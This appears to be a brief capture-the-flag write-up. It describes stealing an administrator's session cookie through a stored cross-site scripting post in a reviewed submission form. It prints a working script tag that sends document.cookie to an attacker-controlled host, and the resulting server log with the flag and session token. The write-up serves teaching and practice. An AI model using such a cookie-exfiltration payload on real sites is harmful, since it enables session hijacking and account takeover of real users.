We have to send a post to submission and and administrator, apparently "REVIEWS" it.

It is a clear idication that someone is going to be looking at our posts that are probably not sanitized.

What we can do is post something like a `session hijacking XSS`

```
This is my test xss post
<script>new Image().src="http://<controlled-server>/a.png?a=" +document.cookie; </script>
```

And observe what requests come to our server. 

Sure enough, we get a request with `104.155.55.51 - - [02/Jul/2019 23:50:18] "GET /a.png?a=flag=CTF{8aaa2f34b392b415601804c2f5f0f24e};%20session=HWSuwX8784CmkQC1Vv0BXETjyXMtNQrV HTTP/1.1" 404 -`